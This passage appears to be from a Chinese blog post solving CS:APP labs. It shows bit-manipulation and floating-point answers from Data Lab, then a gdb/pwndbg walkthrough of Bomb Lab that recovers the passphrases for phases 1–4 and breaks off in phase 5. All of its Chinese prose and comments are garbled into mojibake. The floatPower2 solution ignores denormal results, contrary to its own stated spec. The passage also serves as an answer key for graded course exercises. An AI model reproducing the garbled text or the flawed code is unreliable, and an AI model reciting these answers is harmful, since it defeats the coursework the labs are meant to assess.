å­˜åœ¨1,å¹¶å°†èŒƒå›´ç¼©å°åˆ°é«˜16ä½æˆ–ä½16ä½ // å¦‚æœé«˜16ä½å­˜åœ¨1,åˆ™bit16 == 16,å¦åˆ™ç­‰äº0 bit16 = (!!(x \u0026gt;\u0026gt; 16)) \u0026lt;\u0026lt; 4; x \u0026gt;\u0026gt;= bit16; // æŸ¥æ‰¾å‰©ä½™16ä½ä¸­çš„é«˜8ä½æ˜¯å¦å­˜åœ¨1 bit8 = (!!(x \u0026gt;\u0026gt; 8)) \u0026lt;\u0026lt; 3; x \u0026gt;\u0026gt;= bit8; // æŸ¥æ‰¾å‰©ä½™8ä½ä¸­çš„é«˜4ä½æ˜¯å¦å­˜åœ¨1 bit4 = (!!(x \u0026gt;\u0026gt; 4)) \u0026lt;\u0026lt; 2; x \u0026gt;\u0026gt;= bit4; // æŸ¥æ‰¾å‰©ä½™4ä½ä¸­çš„é«˜2ä½æ˜¯å¦å­˜åœ¨1 bit2 = (!!(x \u0026gt;\u0026gt; 2)) \u0026lt;\u0026lt; 1; x \u0026gt;\u0026gt;= bit2; // æŸ¥æ‰¾å‰©ä½™2ä½ä¸­çš„é«˜1ä½æ˜¯å¦å­˜åœ¨1 bit1 = (!!(x \u0026gt;\u0026gt; 1)) \u0026lt;\u0026lt; 0; x \u0026gt;\u0026gt;= bit1; // æœ€ç»ˆåŠ ä¸Šä¸€ä¸ªç¬¦å·ä½ return bit16 + bit8 + bit4 + bit2 + bit1 + x + 1; } æ±‚æµ®ç‚¹æ•°ä¸2ç›¸ä¹˜çš„å€¼ ç›®å‰æµ®ç‚¹æ•°é€šå¸¸éµå¾ªIEEE 754æ ‡å‡†ï¼Œå‚è§ï¼š\nhttps://zh.wikipedia.org/wiki/IEEE_754\n32ä½ä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨IEEE 754å•ç²¾åº¦æµ®ç‚¹æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 /* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int\u0026#39;s, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 30 * Rating: 4 */ unsigned floatScale2(unsigned uf) { // è·å–å…¶expéƒ¨åˆ†çš„å€¼ int exp = (uf \u0026gt;\u0026gt; 23) \u0026amp; 0xff; int sign = uf \u0026amp; (1 \u0026lt;\u0026lt; 31); // å¦‚æœä¼ å…¥çš„æ˜¯éè§„æ ¼åŒ–çš„å€¼ if(exp == 0) return sign | uf \u0026lt;\u0026lt; 1; // å¦‚æœä¼ å…¥çš„æ˜¯æ— ç©·å¤§æˆ–NaN else if(exp == 0xff) // æ²¡æ³•ç»§ç»­ä¹˜äº†ï¼Œåªèƒ½è¿”å›å‚æ•° return uf; //ä¹˜2 exp++; // å¦‚æœä¹˜2åçš„ç»“æœè¶…å‡ºèŒƒå›´ï¼ˆå³æº¢å‡ºï¼‰ï¼Œåˆ™è¿”å›æ— ç©·å¤§ if(exp == 0xff) return sign | 0x7f800000; // exprå…¨ä¸º0, fracå…¨ä¸º1 // å¦åˆ™è¿”å›æ­£å¸¸ä¹˜2åçš„å€¼ return sign | (exp \u0026lt;\u0026lt; 23) | (uf \u0026amp; 0x7fffff); } æµ®ç‚¹æ•°è½¬æ•´æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 /* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 30 * Rating: 4 */ int floatFloat2Int(unsigned uf) { int exp = (uf \u0026gt;\u0026gt; 23) \u0026amp; 0xff; int sign = (uf \u0026gt;\u0026gt; 31) \u0026amp; 1; int frac = uf \u0026amp; 0x7fffff; int shiftBits = 0; // 0æ¯”è¾ƒç‰¹æ®Šï¼Œå…ˆåˆ¤æ–­0(æ­£è´Ÿ0éƒ½ç®—ä½œ0) if(!(uf \u0026amp; 0x7fffffff)) return 0; // åˆ¤æ–­æ˜¯å¦ä¸ºNaNè¿˜æ˜¯æ— ç©·å¤§ if(exp == 0xff) return 0x80000000u; // æŒ‡æ•°å‡å»åç§»é‡ï¼Œè·å–åˆ°çœŸæ­£çš„æŒ‡æ•° exp -= 127; // éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒåŸæ¥çš„fracä¸€æ—¦å‘å·¦ç§»ä½ï¼Œå…¶å€¼å°±ä¸€å®šä¼šå°äº1ï¼Œæ‰€ä»¥è¿”å›0 if(exp \u0026lt; 0) return 0; // è·å–Mï¼Œæ³¨æ„expç­‰äº-127å’Œä¸ç­‰äº-127çš„æƒ…å†µæ˜¯ä¸ä¸€æ ·çš„ã€‚å½“exp != -127æ—¶è¿˜æœ‰ä¸€ä¸ªéšè—çš„1 if(exp != -127) frac |= (1 \u0026lt;\u0026lt; 23); // è¦ç§»ä½çš„ä½æ•°ã€‚æ³¨æ„floatçš„å°æ•°ç‚¹æ˜¯ç‚¹åœ¨ç¬¬23ä½ä¸ç¬¬22ä½ä¹‹é—´ shiftBits = 23 - exp; // éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œå¦‚æœæŒ‡æ•°è¿‡å¤§ï¼Œåˆ™ä¹Ÿè¿”å›0x80000000u if(shiftBits \u0026lt; 31 - 23) return 0x80000000u; // è·å–çœŸæ­£çš„ç»“æœ frac \u0026gt;\u0026gt;= shiftBits; // åˆ¤æ–­ç¬¦å· if(sign == 1) return ~frac + 1; else return frac; } æ±‚2.0çš„xæ¬¡æ–¹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. Also if, while * Max ops: 30 * Rating: 4 */ unsigned floatPower2(int x) { // å¾—åˆ°åç§»åçš„æŒ‡æ•°exp int exp = x + 127; // å¦‚æœexpå¤§äºç­‰äº255åˆ™ä¸ºæ— ç©·å¤§æˆ–è¶Šç•Œ if(exp \u0026gt; 0xfe) return 0x7f800000; // expä¸º0æ—¶ï¼Œç»“æœä¸º0 else if(exp \u0026lt; 0) return 0; //å› ä¸ºæ˜¯æ±‚ç»“æœçš„æµ®ç‚¹æ•°æ¯”ç‰¹çº§è¡¨ç¤ºï¼Œæ‰€ä»¥åç§»åçš„æŒ‡æ•°ç›´æ¥å·¦ç§»23bitså³å¯ return exp \u0026lt;\u0026lt; 23; } Bomb Lab Bomb Labï¼Œgdbæ‹†å¼¹å®éªŒã€‚é¢˜å¹²ç»™å®šäº†ä¸€ä¸ªç‚¸å¼¹ç¨‹åºï¼Œå’Œå®ƒçš„éƒ¨åˆ†æºç ã€‚æˆ‘ä»¬éœ€è¦åšçš„æ˜¯é€šè¿‡åŠ¨æ€è°ƒè¯•ï¼Œè¿˜åŸ6ä¸ªå¯†ç å¹¶æ­£ç¡®è¾“å…¥ï¼Œé¿å…ç‚¸å¼¹çˆ†ç‚¸ã€‚å¦åˆ™ä¸‹åœºå°±æ˜¯ï¼š\n1 2 3 4 5 6 7 â–¶ ./bomb Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up. Have a nice day! Yaleyale! I don\u0026#39;t give a shit!!! BOOM!!! The bomb has blown up. å¥½äº†ï¼Œæ­£å„¿å…«ç»æ¥æ‹†æ‹†çœ‹ï¼Œç›´æ¥ä¸Šé’³å­ï¼šgdb bomb\né€šè¿‡bomb.cå¯çŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ‰¾å‡ºçš„å¯†ç å†™å…¥æ–‡ä»¶ä¸­ä¾›bombè¯»å–ï¼Œæ–¹ä¾¿åšé¢˜\nphase_1 ç‚¸å¼¹1ï¼š\n1 2 3 4 5 6 7 8 9 pwndbg\u0026gt; b phase_1 Breakpoint 1 at 0x400ee0 pwndbg\u0026gt; r Starting program: /home/zkv/Gitrepos/A-B_Problem/csapp/BombLab/bomb [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up. Have a nice day! AAAAAAAA ç›´æ¥åœ¨ç¬¬ä¸€å…³ä¸‹æ–­ç‚¹ï¼Œéšä¾¿è¾“ä¸ªå­—ç¬¦ä¸²AAAAAAAAï¼Œæ¥ç€å‘ä¸‹èµ°ä¸¤æ­¥åˆ°æ ¡éªŒçš„ä½ç½®\n1 2 3 4 5 6 7 0x400ee0 \u0026lt;phase_1\u0026gt; sub rsp, 8 0x400ee4 \u0026lt;phase_1+4\u0026gt; mov esi, 0x402400 â–º 0x400ee9 \u0026lt;phase_1+9\u0026gt; call strings_not_equal \u0026lt;strings_not_equal\u0026gt; rdi: 0x603780 (input_strings) â—‚â€” \u0026#39;AAAAAAAA\u0026#39; rsi: 0x402400 â—‚â€” outsd dx, dword ptr [rsi] /* \u0026#39;Border relations with Canada have never been better.\u0026#39; */ rdx: 0x1 rcx: 0x8 å¯çŸ¥ç¬¬ä¸€å…³å¯†ç ä¸ºï¼šBorder relations with Canada have never been better.\nå†™å…¥å¯†ç æœ¬ï¼šecho \u0026quot;Border relations with Canada have never been better.\u0026quot; \u0026gt;\u0026gt; passcodes\nphase_2 ç”¨å¯†ç æœ¬ç›´æ¥æ¥åˆ°ç¬¬äºŒå…³ï¼šgdb --args bomb passcodes\n1 2 3 4 5 6 7 8 9 10 pwndbg\u0026gt; b phase_2 Breakpoint 1 at 0x400efc pwndbg\u0026gt; r Starting program: /home/zkv/Gitrepos/A-B_Problem/csapp/BombLab/bomb passcodes [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up. Have a nice day! Phase 1 defused. How about the next one? AAAAAAAA å‘ä¸‹è·Ÿè¸ªåˆ°ç¬¬äºŒå…³çš„æ ¡éªŒé€»è¾‘ä¸­ã€‚é¦–å…ˆæ˜¯ä»æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­è¯»å–6ä¸ªæ•°å­—ï¼š\n1 2 3 4 â–º 0x40148a \u0026lt;read_six_numbers+46\u0026gt; call __isoc99_sscanf@plt \u0026lt;__isoc99_sscanf@plt\u0026gt; s: 0x6037d0 (input_strings+80) â—‚â€” \u0026#39;AAAAAAAA\u0026#39; format: 0x4025c3 â—‚â€” \u0026#39;%d %d %d %d %d %d\u0026#39; vararg: 0x7fffffffe070 â€”â–¸ 0x7fffffffe1c8 â€”â–¸ 0x7fffffffe4d5 â—‚â€” \u0026#39;/home/zkv/Gitrepos/A-B_Problem/csapp/BombLab/bomb\u0026#39; æ¥ç€å›åˆ°phase_2å‡½æ•°ä¸­è¿›è¡Œæ ¡éªŒï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 pwndbg\u0026gt; disassemble Dump of assembler code for function phase_2: 0x0000000000400efc \u0026lt;+0\u0026gt;: push rbp 0x0000000000400efd \u0026lt;+1\u0026gt;: push rbx 0x0000000000400efe \u0026lt;+2\u0026gt;: sub rsp,0x28 0x0000000000400f02 \u0026lt;+6\u0026gt;: mov rsi,rsp 0x0000000000400f05 \u0026lt;+9\u0026gt;: call 0x40145c \u0026lt;read_six_numbers\u0026gt; 0x0000000000400f0a \u0026lt;+14\u0026gt;: cmp DWORD PTR [rsp],0x1 0x0000000000400f0e \u0026lt;+18\u0026gt;: je 0x400f30 \u0026lt;phase_2+52\u0026gt; 0x0000000000400f10 \u0026lt;+20\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000400f15 \u0026lt;+25\u0026gt;: jmp 0x400f30 \u0026lt;phase_2+52\u0026gt; =\u0026gt; 0x0000000000400f17 \u0026lt;+27\u0026gt;: mov eax,DWORD PTR [rbx-0x4] 0x0000000000400f1a \u0026lt;+30\u0026gt;: add eax,eax 0x0000000000400f1c \u0026lt;+32\u0026gt;: cmp DWORD PTR [rbx],eax 0x0000000000400f1e \u0026lt;+34\u0026gt;: je 0x400f25 \u0026lt;phase_2+41\u0026gt; 0x0000000000400f20 \u0026lt;+36\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000400f25 \u0026lt;+41\u0026gt;: add rbx,0x4 0x0000000000400f29 \u0026lt;+45\u0026gt;: cmp rbx,rbp 0x0000000000400f2c \u0026lt;+48\u0026gt;: jne 0x400f17 \u0026lt;phase_2+27\u0026gt; 0x0000000000400f2e \u0026lt;+50\u0026gt;: jmp 0x400f3c \u0026lt;phase_2+64\u0026gt; 0x0000000000400f30 \u0026lt;+52\u0026gt;: lea rbx,[rsp+0x4] 0x0000000000400f35 \u0026lt;+57\u0026gt;: lea rbp,[rsp+0x18] 0x0000000000400f3a \u0026lt;+62\u0026gt;: jmp 0x400f17 \u0026lt;phase_2+27\u0026gt; 0x0000000000400f3c \u0026lt;+64\u0026gt;: add rsp,0x28 0x0000000000400f40 \u0026lt;+68\u0026gt;: pop rbx 0x0000000000400f41 \u0026lt;+69\u0026gt;: pop rbp 0x0000000000400f42 \u0026lt;+70\u0026gt;: ret \u0026lt;+27\u0026gt;åˆ°\u0026lt;+41\u0026gt;ä¹‹é—´ä¸ºå¾ªç¯æ ¡éªŒçš„é€»è¾‘ã€‚å…·ä½“æ˜¯æ¯”è¾ƒDWORD PTR [rbx]æ˜¯å¦ç­‰äº(DWORD PTR [rbx-0x4]) * 2ã€‚è€Œæ¯ä¸€è½®å¾ªç¯ä¸­DWORD PTR [rbx]å­˜æ”¾çš„å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ•°å­—ã€‚æ¯”å¦‚ç¬¬ä¸€è½®å¾ªç¯ï¼š\n1 2 pwndbg\u0026gt; x $rbx-4 0x7fffffffe070: 0x00000001 é‚£ç¬¬äºŒè½®å¾ªç¯å°±åº”è¯¥ï¼š\n1 2 pwndbg\u0026gt; x $rbx-4 0x7fffffffe070: 0x00000002 æ‰€ä»¥æˆ‘ä»¬è¾“å…¥ï¼š1 2 4 8 16 32å³å¯é€šå…³\necho \u0026quot;1 2 4 8 16 32\u0026quot; \u0026gt;\u0026gt; passcodes\nphase_3 ç”¨å¯†ç æœ¬ç›´æ¥æ¥åˆ°ç¬¬ä¸‰å…³ï¼šgdb -ex \u0026quot;b phase_3\u0026quot; -ex \u0026quot;r\u0026quot; --args bomb passcodes\nåæ±‡ç¼–çœ‹çœ‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 pwndbg\u0026gt; disassemble phase_3 Dump of assembler code for function phase_3: =\u0026gt; 0x0000000000400f43 \u0026lt;+0\u0026gt;: sub rsp,0x18 0x0000000000400f47 \u0026lt;+4\u0026gt;: lea rcx,[rsp+0xc] 0x0000000000400f4c \u0026lt;+9\u0026gt;: lea rdx,[rsp+0x8] 0x0000000000400f51 \u0026lt;+14\u0026gt;: mov esi,0x4025cf 0x0000000000400f56 \u0026lt;+19\u0026gt;: mov eax,0x0 0x0000000000400f5b \u0026lt;+24\u0026gt;: call 0x400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 0x0000000000400f60 \u0026lt;+29\u0026gt;: cmp eax,0x1 0x0000000000400f63 \u0026lt;+32\u0026gt;: jg 0x400f6a \u0026lt;phase_3+39\u0026gt; 0x0000000000400f65 \u0026lt;+34\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000400f6a \u0026lt;+39\u0026gt;: cmp DWORD PTR [rsp+0x8],0x7 0x0000000000400f6f \u0026lt;+44\u0026gt;: ja 0x400fad \u0026lt;phase_3+106\u0026gt; 0x0000000000400f71 \u0026lt;+46\u0026gt;: mov eax,DWORD PTR [rsp+0x8] 0x0000000000400f75 \u0026lt;+50\u0026gt;: jmp QWORD PTR [rax*8+0x402470] 0x0000000000400f7c \u0026lt;+57\u0026gt;: mov eax,0xcf 0x0000000000400f81 \u0026lt;+62\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400f83 \u0026lt;+64\u0026gt;: mov eax,0x2c3 0x0000000000400f88 \u0026lt;+69\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400f8a \u0026lt;+71\u0026gt;: mov eax,0x100 0x0000000000400f8f \u0026lt;+76\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400f91 \u0026lt;+78\u0026gt;: mov eax,0x185 0x0000000000400f96 \u0026lt;+83\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400f98 \u0026lt;+85\u0026gt;: mov eax,0xce 0x0000000000400f9d \u0026lt;+90\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400f9f \u0026lt;+92\u0026gt;: mov eax,0x2aa 0x0000000000400fa4 \u0026lt;+97\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400fa6 \u0026lt;+99\u0026gt;: mov eax,0x147 0x0000000000400fab \u0026lt;+104\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400fad \u0026lt;+106\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000400fb2 \u0026lt;+111\u0026gt;: mov eax,0x0 0x0000000000400fb7 \u0026lt;+116\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400fb9 \u0026lt;+118\u0026gt;: mov eax,0x137 0x0000000000400fbe \u0026lt;+123\u0026gt;: cmp eax,DWORD PTR [rsp+0xc] 0x0000000000400fc2 \u0026lt;+127\u0026gt;: je 0x400fc9 \u0026lt;phase_3+134\u0026gt; 0x0000000000400fc4 \u0026lt;+129\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000400fc9 \u0026lt;+134\u0026gt;: add rsp,0x18 0x0000000000400fcd \u0026lt;+138\u0026gt;: ret é˜…è¯»åæ±‡ç¼–ä»£ç å¯çŸ¥ï¼Œæ­¤å…³éœ€è¾“å…¥ä¸¤ä¸ªæ•°å­—ã€‚ç¬¬ä¸€ä¸ªæ•°å­—éœ€å°äº7ï¼Œç¬¬äºŒä¸ªæ•°å­—çš„å€¼ç”±è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—æ¨å¯¼å¾—å‡ºï¼ˆswitch caseç»“æ„ï¼‰ã€‚ç¬¬ä¸€ä¸ªæ•°å­—è¾“å…¥ä¸º1ï¼Œæ¥åˆ°ï¼š\n1 2 3 4 5 6 0x400f71 \u0026lt;phase_3+46\u0026gt; mov eax, dword ptr [rsp + 8] 0x400f75 \u0026lt;phase_3+50\u0026gt; jmp qword ptr [rax*8 + 0x402470] â†“ â–º 0x400fb9 \u0026lt;phase_3+118\u0026gt; mov eax, 0x137 0x400fbe \u0026lt;phase_3+123\u0026gt; cmp eax, dword ptr [rsp + 0xc] 0x400fc2 \u0026lt;phase_3+127\u0026gt; je phase_3+134 \u0026lt;phase_3+134\u0026gt; å¾—ä¸€ä¸ªåˆæ³•çš„è§£æ˜¯ï¼š1 311\necho \u0026quot;1 311\u0026quot; \u0026gt;\u0026gt; passcodes\nphase_4 å…ˆæ¥çœ‹çœ‹phase_4å‡½æ•°çš„åæ±‡ç¼–ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 0x000000000040100c \u0026lt;+0\u0026gt;: sub rsp,0x18 0x0000000000401010 \u0026lt;+4\u0026gt;: lea rcx,[rsp+0xc] 0x0000000000401015 \u0026lt;+9\u0026gt;: lea rdx,[rsp+0x8] 0x000000000040101a \u0026lt;+14\u0026gt;: mov esi,0x4025cf 0x000000000040101f \u0026lt;+19\u0026gt;: mov eax,0x0 0x0000000000401024 \u0026lt;+24\u0026gt;: call 0x400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 0x0000000000401029 \u0026lt;+29\u0026gt;: cmp eax,0x2 0x000000000040102c \u0026lt;+32\u0026gt;: jne 0x401035 \u0026lt;phase_4+41\u0026gt; 0x000000000040102e \u0026lt;+34\u0026gt;: cmp DWORD PTR [rsp+0x8],0xe 0x0000000000401033 \u0026lt;+39\u0026gt;: jbe 0x40103a \u0026lt;phase_4+46\u0026gt; 0x0000000000401035 \u0026lt;+41\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x000000000040103a \u0026lt;+46\u0026gt;: mov edx,0xe 0x000000000040103f \u0026lt;+51\u0026gt;: mov esi,0x0 0x0000000000401044 \u0026lt;+56\u0026gt;: mov edi,DWORD PTR [rsp+0x8] 0x0000000000401048 \u0026lt;+60\u0026gt;: call 0x400fce \u0026lt;func4\u0026gt; 0x000000000040104d \u0026lt;+65\u0026gt;: test eax,eax 0x000000000040104f \u0026lt;+67\u0026gt;: jne 0x401058 \u0026lt;phase_4+76\u0026gt; 0x0000000000401051 \u0026lt;+69\u0026gt;: cmp DWORD PTR [rsp+0xc],0x0 0x0000000000401056 \u0026lt;+74\u0026gt;: je 0x40105d \u0026lt;phase_4+81\u0026gt; 0x0000000000401058 \u0026lt;+76\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x000000000040105d \u0026lt;+81\u0026gt;: add rsp,0x18 0x0000000000401061 \u0026lt;+85\u0026gt;: ret å¯çŸ¥è¿™ä¸€å…³ä¹Ÿæ˜¯è®©æˆ‘ä»¬è¾“å…¥ä¸¤ä¸ªæ•°å­—a bï¼Œä¸”è¦æ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼š\n(unsigned)a \u0026lt; 14 b == 0 func4(a, 0, 14) == 0 func4åæ±‡ç¼–å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 0x0000000000400fce \u0026lt;+0\u0026gt;: sub rsp,0x8 0x0000000000400fd2 \u0026lt;+4\u0026gt;: mov eax,edx 0x0000000000400fd4 \u0026lt;+6\u0026gt;: sub eax,esi 0x0000000000400fd6 \u0026lt;+8\u0026gt;: mov ecx,eax 0x0000000000400fd8 \u0026lt;+10\u0026gt;: shr ecx,0x1f 0x0000000000400fdb \u0026lt;+13\u0026gt;: add eax,ecx 0x0000000000400fdd \u0026lt;+15\u0026gt;: sar eax,1 0x0000000000400fdf \u0026lt;+17\u0026gt;: lea ecx,[rax+rsi*1] 0x0000000000400fe2 \u0026lt;+20\u0026gt;: cmp ecx,edi 0x0000000000400fe4 \u0026lt;+22\u0026gt;: jle 0x400ff2 \u0026lt;func4+36\u0026gt; 0x0000000000400fe6 \u0026lt;+24\u0026gt;: lea edx,[rcx-0x1] 0x0000000000400fe9 \u0026lt;+27\u0026gt;: call 0x400fce \u0026lt;func4\u0026gt; 0x0000000000400fee \u0026lt;+32\u0026gt;: add eax,eax 0x0000000000400ff0 \u0026lt;+34\u0026gt;: jmp 0x401007 \u0026lt;func4+57\u0026gt; 0x0000000000400ff2 \u0026lt;+36\u0026gt;: mov eax,0x0 0x0000000000400ff7 \u0026lt;+41\u0026gt;: cmp ecx,edi 0x0000000000400ff9 \u0026lt;+43\u0026gt;: jge 0x401007 \u0026lt;func4+57\u0026gt; 0x0000000000400ffb \u0026lt;+45\u0026gt;: lea esi,[rcx+0x1] 0x0000000000400ffe \u0026lt;+48\u0026gt;: call 0x400fce \u0026lt;func4\u0026gt; 0x0000000000401003 \u0026lt;+53\u0026gt;: lea eax,[rax+rax*1+0x1] 0x0000000000401007 \u0026lt;+57\u0026gt;: add rsp,0x8 0x000000000040100b \u0026lt;+61\u0026gt;: ret func4æ˜¯ä¸€ä¸ªé€’å½’å‡½æ•°ï¼ŒIDAåç¼–è¯‘å¾—ï¼Œä»…ä¾›å‚è€ƒï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 __int64 __fastcall func4(__int64 a1, __int64 a2, int a3) { int v3; // ecx __int64 result; // rax v3 = (a3 - (int)a2) / 2 + a2; if ( v3 \u0026gt; (int)a1 ) return 2 * (unsigned int)func4(a1, a2); result = 0LL; if ( v3 \u0026lt; (int)a1 ) return 2 * (unsigned int)func4(a1, (unsigned int)(v3 + 1)) + 1; return result; } å°†func4åæ±‡ç¼–å‡½æ•°é‡å†™ä¸ºå¯ç¼–è¯‘çš„å½¢å¼åï¼Œç¼–å†™æ±‡ç¼–ç¨‹åºå¯¹æ­¤å‡½æ•°æš´åŠ›æšä¸¾ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 global _start section .rodata s_msg: db \u0026#34;satisfy!!\u0026#34;, 10 d_msg: db \u0026#34;failed!!!\u0026#34;, 10 section .text func4: sub rsp,0x8 mov eax,edx sub eax,esi mov ecx,eax shr ecx,0x1f add eax,ecx sar eax,1 lea ecx,[rax+rsi*1] cmp ecx,edi jle p36 lea edx,[rcx-0x1] call func4 add eax,eax jmp p57 p36: mov eax,0x0 cmp ecx,edi jge p57 lea esi,[rcx+0x1] call func4 lea eax,[rax+rax*1+0x1] p57: add rsp,0x8 ret _start: mov r12, -1 loop: add r12, 1 cmp r12, 10 je exit mov rdi, r12 mov rsi, 0 mov rdx, 14 call func4 test eax, eax jne dissatisfy mov rsi, s_msg jmp print dissatisfy: mov rsi, d_msg print: mov rax, 1 mov rdi, 1 mov rdx, 10 syscall jmp loop exit: mov rax, 60 mov rdi, 0 syscall æ±‡ç¼–å¹¶è¿è¡Œï¼š\n1 2 3 nasm -f elf64 -o phase_4.o phase_4.S ld -o phase_4 phase_4.o ./phase_4 ç”±è¾“å‡ºå¯å¾—ï¼Œ0ï½9ä¸­æ»¡è¶³æ¡ä»¶çš„è§£ä¸º0ã€1ã€3ã€7\næ•…æ­¤å…³çš„ä¸€ä¸ªåˆæ³•è§£ä¸º7 0\necho \u0026quot;7 0\u0026quot; \u0026gt;\u0026gt; passcodes\nphase_5 phase_5å‡½æ•°åæ±‡ç¼–ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 0x0000000000401062 \u0026lt;+0\u0026gt;: push rbx 0x0000000000401063 \u0026lt;+1\u0026gt;: sub rsp,0x20 0x0000000000401067 \u0026lt;+5\u0026gt;: mov rbx,rdi 0x000000000040106a \u0026lt;+8\u0026gt;: mov rax,QWORD PTR fs:0x28 0x0000000000401073 \u0026lt;+17\u0026gt;: mov QWORD PTR [rsp+0x18],rax 0x0000000000401078 \u0026lt;+22\u0026gt;: xor eax,eax 0x000000000040107a \u0026lt;+24\u0026gt;: call 0x40131b \u0026lt;string_length\u0026gt; 0x000000000040107f \u0026lt;+29\u0026gt;: cmp eax,0x6 0x0000000000401082 \u0026lt;+32\u0026gt;: je 0x4010d2 \u0026lt;phase_5+112\u0026gt; 0x0000000000401084 \u0026lt;+34\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000401089 \u0026lt;+39\u0026gt;: jmp 0x4010d2 \u0026lt;phase_5+112\u0026gt; 0x000000000040108b \u0026lt;+41\u0026gt;: movzx ecx,BYTE PTR [rbx+rax*1] 0x000000000040108f \u0026lt;+45\u0026gt;: mov BYTE PTR [rsp],cl 0x0000000000401092 \u0026lt;+48\u0026gt;: mov rdx,QWORD PTR [rsp] 0x0000000000401096 \u0026lt;+52\u0026gt;: and edx,0xf 0x0000000000401099 \u0026lt;+55\u0026gt;: movzx edx,BYTE PTR [rdx+0x4024b0] 0x00000000004010a0 \u0026lt;+62\u0026gt;: mov BYTE PTR [rsp+rax*1+0x10],dl 0x00000000004010a4 \u0026lt;+66\u0026gt;: add rax,0x1 0x00000000004010a8 \u0026lt;+70\u0026gt;: cmp rax,0x6 0x00000000004010ac \u0026lt;+74\u0026gt;: jne 0x40108b \u0026lt;phase_5+41\u0026gt; 0x00000000004010ae \u0026lt;+76\u0026gt;: mov BYTE PTR [rsp+0x16],0x0 0x00000000004010b3 \u0026lt;+81\u0026gt;: mov esi,0x40245e 0x00000000004010b8 \u0026lt;+86\u0026gt;: lea rdi,[rsp+0x10] 0x00000000004010bd \u0026lt;+91\u0026gt;: call 0x401338 \u0026lt;strings_not_equal\u0026gt; 0x00000000004010c2 \u0026lt;+96\u0026gt;: test eax,eax 0x00000000004010c4 \u0026lt;+98\u0026gt;: je 0x4010d9 \u0026lt;phase_5+119\u0026gt; 0x00000000004010c6 \u0026lt;+100\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x00000000004010cb \u0026lt;+105\u0026gt;: nop DWORD PTR [rax+rax*1+0x0] 0x00000000004010d0 \u0026lt;+110\u0026gt;: jmp 0x4010d9 